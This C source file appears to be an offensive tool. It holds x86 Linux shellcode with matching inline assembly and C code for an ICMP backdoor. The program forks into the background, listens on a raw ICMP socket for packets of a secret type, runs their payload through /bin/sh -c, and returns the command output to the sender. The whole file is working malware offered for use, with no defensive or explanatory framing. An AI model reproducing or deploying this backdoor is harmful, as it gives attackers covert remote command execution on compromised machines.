#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define ICMPTYPE        0x99

char shell[] =
        "\x31\xc0\x31\xdb\x31\xc9\xb0\x66"
        "\x43\x53\xb1\x03\x51\x49\x51\x89"
        "\xe1\xcd\x80\x89\xc7\xb0\x02\xcd"
        "\x80\x21\xc0\x74\x05\x31\xc0\x40"
        "\xcd\x80\x31\xc0\x31\xdb\x89\xe6"
        "\x66\x81\xee\x01\x01\xb0\x10\x50"
        "\x54\xb0\xff\x56\x53\x50\x55\x57"
        "\x89\xe1\xb0\x66\xb3\x0c\xcd\x80"
        "\x89\xe9\x01\xc1\x31\xc0\x88\x41"
        "\xff\xb0\x15\x01\xc5\xb0\x99\x32"
        "\x45\xff\x75\xce\xb0\x07\x01\xc5"
        "\x89\xeb\xb0\x2a\xcd\x80\xb0\x08"
        "\x01\xc5\xb0\x02\xcd\x80\x21\xc0"
        "\x74\x40\x4b\x89\xdd\x31\xc0\x8b"
        "\x5d\x01\x89\xe1\x80\xed\x11\xc6"
        "\x01\x9a\x41\xb0\x03\x99\xb6\x10"
        "\xcd\x80\x49\x99\xb2\x10\x52\x56"
        "\x99\x52\x40\x50\x48\x51\x57\x89"
        "\xe1\x89\xc2\x31\xc0\x31\xdb\xb3"
        "\x0b\xb0\x66\xcd\x80\x31\xc0\xb4"
        "\x10\x31\xd0\x74\xc8\xe9\x78\xff"
        "\xff\xff\x31\xc0\x31\xc9\x8b\x5b"
        "\x04\xb0\x3f\x41\xcd\x80\xb0\x3f"
        "\x41\xcd\x80\x99\x52\x66\x68\x2d"
        "\x63\x89\xe1\x52\x68\x2f\x2f\x73"
        "\x68\x68\x2f\x62\x69\x6e\x89\xe3"
        "\x52\x55\x51\x53\x89\xe1\xb0\x0b"
        "\xcd\x80";

void asm_code() {
        __asm("
                xorl %eax,%eax
                xorl %ebx,%ebx
                xorl %ecx,%ecx
                movb $0x66,%al
                incl %ebx
                push %ebx
                movb $0x3,%cl
                push %ecx
                decl %ecx
                push %ecx
                movl %esp,%ecx
                int  $0x80              /* socket(); */
                movl %eax,%edi

                movb $0x2,%al
                int  $0x80              /* fork(); */
                andl %eax,%eax
                jz   endlessloop
        exit:
                xorl %eax,%eax
                incl %eax
                int  $0x80              /* exit(); */
        endlessloop:
                xorl %eax,%eax
                xorl %ebx,%ebx
                movl %esp,%esi
                subw $0x0101,%si
                movb $0x10,%al
                push %eax
                push %esp
                movb $0xff,%al
                push %esi
                push %ebx
                push %eax       
                push %ebp
                push %edi
                movl %esp,%ecx
                movb $0x66,%al
                movb $0x0c,%bl
                int  $0x80              /* recvfrom(); */

                movl %ebp,%ecx
                addl %eax,%ecx
                xorl %eax,%eax
                movb %al,-1(%ecx)

                movb $0x15,%al
                addl %eax,%ebp
                movb $0x99,%al          /* SECRET_TYPE */
                xorb -1(%ebp),%al
                jnz  endlessloop
                movb $0x7,%al
                addl %eax,%ebp

                movl %ebp,%ebx
                movb $0x2a,%al
                int  $0x80              /* pipe(); */

                movb $0x8,%al
                addl %eax,%ebp

                movb $0x2,%al
                int  $0x80              /* fork(); */
                andl %eax,%eax
                jz   execve_call

                decl %ebx
                movl %ebx,%ebp
        readloop:
                xorl %eax,%eax
                movl 1(%ebp),%ebx
                movl %esp,%ecx
                subb $0x11,%ch
                movb $0x9a,(%ecx)       /* SECRET_TYPE + 1 */
                incl %ecx
                movb $0x3,%al
                cdq
                movb $0x10,%dh
                int  $0x80              /* read(); */

                decl %ecx
                cdq
                movb $0x10,%dl
                push %edx
                push %esi
                cdq
                push %edx
                incl %eax
                push %eax
                decl %eax
                push %ecx
                push %edi
                movl %esp,%ecx
                movl %eax,%edx
                xorl %eax,%eax
                xorl %ebx,%ebx
                movb $0xb,%bl
                movb $0x66,%al
                int  $0x80              /* sendto(); */

                xorl %eax,%eax
                movb $0x10,%ah
                xorl %edx,%eax
                jz   readloop   

                jmp  endlessloop 
        execve_call:
                xorl %eax,%eax
                xorl %ecx,%ecx
                movl 4(%ebx),%ebx
                movb $0x3f,%al
                incl %ecx
                int  $0x80              /* dup2(); */
                movb $0x3f,%al
                incl %ecx
                int  $0x80              /* dup2(); */

                cdq
                push %edx
                pushw $0x632d
                movl %esp,%ecx
                push %edx
                push $0x68732f2f
                push $0x6e69622f
                movl %esp,%ebx
                push %edx
                push %ebp
                push %ecx
                push %ebx
                movl %esp,%ecx
                movb $0xb,%al
                int  $0x80              /* execve(); */

        ");
}


void c_code() {
        int fd;
        int fds[2];
        int nb = 0;
        struct sockaddr_in them;
        int them_size = sizeof(struct sockaddr);
        unsigned char buf[4100];
        char *prog[] = {"/bin/sh","-c",&buf[36],NULL};

        fd = socket(2,3,1);
        if (fork() > 0) exit(0);
        while (1) {
                nb = 0;
                memset(buf,0,sizeof(buf));
                while ((nb=recvfrom(fd,buf,256,0,(struct sockaddr *)&them,&them
_size))&&(buf[20]!=(unsigned char)ICMPTYPE));
                buf[nb-1] = 0;
                pipe(fds);
                if (!fork()) {
                        dup2(fds[1],1);
                        dup2(fds[1],2);
                        execve(prog[0],prog,NULL);
                        exit(0);
                } else {
                        buf[0] = ICMPTYPE+1;
                        do {
                                nb = read(fds[0],&buf[1],4096);
                                sendto(fd,buf,nb+1,0,(struct sockaddr *)&them,t
hem_size);      
                        } while(nb == 4096);
                }
        }
}

int main(int c,char *v[]) {
        void (*i)();
        i = (void (*)())shell;
        fprintf(stderr,"Size of shellcode = %d\n\n",strlen(shell));
        i();
        return 0;
}
